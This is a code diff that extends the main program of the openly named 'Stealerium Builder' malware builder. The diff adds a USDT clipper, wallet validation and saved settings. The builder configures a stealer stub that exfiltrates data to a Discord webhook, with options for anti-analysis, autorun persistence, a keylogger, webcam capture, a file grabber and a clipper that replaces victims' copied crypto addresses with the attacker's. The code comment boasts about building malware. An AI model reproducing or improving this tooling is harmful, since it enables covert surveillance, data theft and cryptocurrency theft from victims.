@@ -1,3 +1,17 @@
+/*
+ * Stealerium Builder - Main Program
+ * 
+ * 🔥 Enhanced by @chocolaid on GitHub
+ * 
+ * Features Added:
+ * - USDT clipper support with validation
+ * - Settings persistence system integration
+ * - Wallet validation for all supported cryptocurrencies
+ * - Enhanced webhook validation with pattern matching
+ * 
+ * "Building malware like a true professional" 💀
+ */
+
 using Builder.Modules;
 using Builder.Modules.build;
 
@@ -8,8 +22,11 @@ internal class Program
     [STAThread]
     private static void Main()
     {
+        // Load previous settings
+        var settings = Settings.LoadSettings();
+        
         // Settings
-        var token = Cli.GetStringValue("Discord webhook url");
+        var token = Cli.GetStringValue("Discord webhook url", settings.Webhook);
         // Test connection to Discord webhook url
         if (!Discord.WebhookIsValid(token))
             Cli.ShowError("Check the fucking webhook url!");
@@ -20,28 +37,48 @@ internal class Program
         // Encrypt values
         Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token);
         // Debug mode (write all exceptions to file)
-        Build.ConfigValues["Debug"] = Cli.GetBoolValue("Debug all exceptions to file ?");
+        Build.ConfigValues["Debug"] = Cli.GetBoolValue("Debug all exceptions to file ?", settings.Debug);
         // Installation
-        Build.ConfigValues["AntiAnalysis"] = Cli.GetBoolValue("Use anti analysis?");
-        Build.ConfigValues["Startup"] = Cli.GetBoolValue("Install autorun?");
-        Build.ConfigValues["StartDelay"] = Cli.GetBoolValue("Use random start delay?");
+        Build.ConfigValues["AntiAnalysis"] = Cli.GetBoolValue("Use anti analysis?", settings.AntiAnalysis);
+        Build.ConfigValues["Startup"] = Cli.GetBoolValue("Install autorun?", settings.Startup);
+        Build.ConfigValues["StartDelay"] = Cli.GetBoolValue("Use random start delay?", settings.StartDelay);
         // Modules
         if (Build.ConfigValues["Startup"].Equals("1"))
         {
-            Build.ConfigValues["WebcamScreenshot"] = Cli.GetBoolValue("Create webcam screenshots?");
-            Build.ConfigValues["Keylogger"] = Cli.GetBoolValue("Install keylogger?");
-            Build.ConfigValues["Clipper"] = Cli.GetBoolValue("Install clipper?");
+            Build.ConfigValues["WebcamScreenshot"] = Cli.GetBoolValue("Create webcam screenshots?", settings.WebcamScreenshot);
+            Build.ConfigValues["Keylogger"] = Cli.GetBoolValue("Install keylogger?", settings.Keylogger);
+            Build.ConfigValues["Clipper"] = Cli.GetBoolValue("Install clipper?", settings.Clipper);
         }
 
-        Build.ConfigValues["Grabber"] = Cli.GetBoolValue("File Grabber ?");
+        Build.ConfigValues["Grabber"] = Cli.GetBoolValue("File Grabber ?", settings.Grabber);
 
         // Clipper addresses
         if (Build.ConfigValues["Clipper"].Equals("1"))
         {
-            Build.ConfigValues["ClipperBTC"] = Cli.GetEncryptedString("Clipper : Your bitcoin address");
-            Build.ConfigValues["ClipperETH"] = Cli.GetEncryptedString("Clipper : Your etherium address");
-            Build.ConfigValues["ClipperLTC"] = Cli.GetEncryptedString("Clipper : Your litecoin address");
+            Build.ConfigValues["ClipperBTC"] = Cli.GetValidatedWallet("Clipper : Your bitcoin address", "bitcoin", settings.ClipperBTC);
+            Build.ConfigValues["ClipperETH"] = Cli.GetValidatedWallet("Clipper : Your etherium address", "ethereum", settings.ClipperETH);
+            Build.ConfigValues["ClipperLTC"] = Cli.GetValidatedWallet("Clipper : Your litecoin address", "litecoin", settings.ClipperLTC);
+            Build.ConfigValues["ClipperUSDT"] = Cli.GetValidatedWallet("Clipper : Your USDT address", "usdt", settings.ClipperUSDT);
         }
+
+        // Save current settings for next time
+        var currentSettings = new SettingsData
+        {
+            Webhook = token,
+            Debug = Build.ConfigValues["Debug"],
+            AntiAnalysis = Build.ConfigValues["AntiAnalysis"],
+            Startup = Build.ConfigValues["Startup"],
+            StartDelay = Build.ConfigValues["StartDelay"],
+            WebcamScreenshot = Build.ConfigValues["WebcamScreenshot"],
+            Keylogger = Build.ConfigValues["Keylogger"],
+            Clipper = Build.ConfigValues["Clipper"],
+            Grabber = Build.ConfigValues["Grabber"],
+            ClipperBTC = Build.ConfigValues["ClipperBTC"],
+            ClipperETH = Build.ConfigValues["ClipperETH"],
+            ClipperLTC = Build.ConfigValues["ClipperLTC"],
+            ClipperUSDT = Build.ConfigValues["ClipperUSDT"]
+        };
+        Settings.SaveSettings(currentSettings);
 
         // Build
         var build = Build.BuildStub();
